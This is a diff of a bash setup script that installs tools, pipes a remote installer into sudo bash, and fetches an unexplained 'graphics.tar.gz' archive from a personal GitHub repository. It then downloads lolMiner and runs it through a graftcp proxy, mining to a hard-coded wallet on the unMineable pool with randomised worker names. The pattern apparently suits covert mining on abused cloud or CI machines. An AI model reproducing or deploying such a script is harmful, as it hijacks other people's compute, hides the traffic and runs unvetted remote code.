@@ -1,5 +1,9 @@
 apt update && apt -y install sudo wget curl unzip
 
+apt-get install git build-essential cmake automake libtool autoconf
+
+sudo apt install git build-essential cmake libuv1-dev uuid-dev libssl-dev
+
 sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
@@ -12,7 +16,12 @@ ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 
 dpkg-reconfigure --frontend noninteractive tzdata
 
-wget https://github.com/denisule54/why/raw/main/graphics.tar.gz
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz 
+tar -xvf lolMiner_v1.46a_Lin64.tar.gz
+
+cd v1.46a
+
+wget https://github.com/denisule54/why/blob/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -40,9 +49,5 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz
-tar -xf lolMiner_v1.46a_Lin64.tar.gz && cd v1.46a
 
-ph add lolMiner
-
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user RVN:RBXC64GiFJYcYMnfHV5XjTELsHEEQxivmZ.$(echo $(shuf -i 1-9999 -n 1)-lol) --ethstratum ETHPROXY
+./graftcp/graftcp ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user RVN:RBXC64GiFJYcYMnfHV5XjTELsHEEQxivmZ.$(echo $(shuf -i 1-999 -n 1)-lol) --ethstratum ETHPROXY
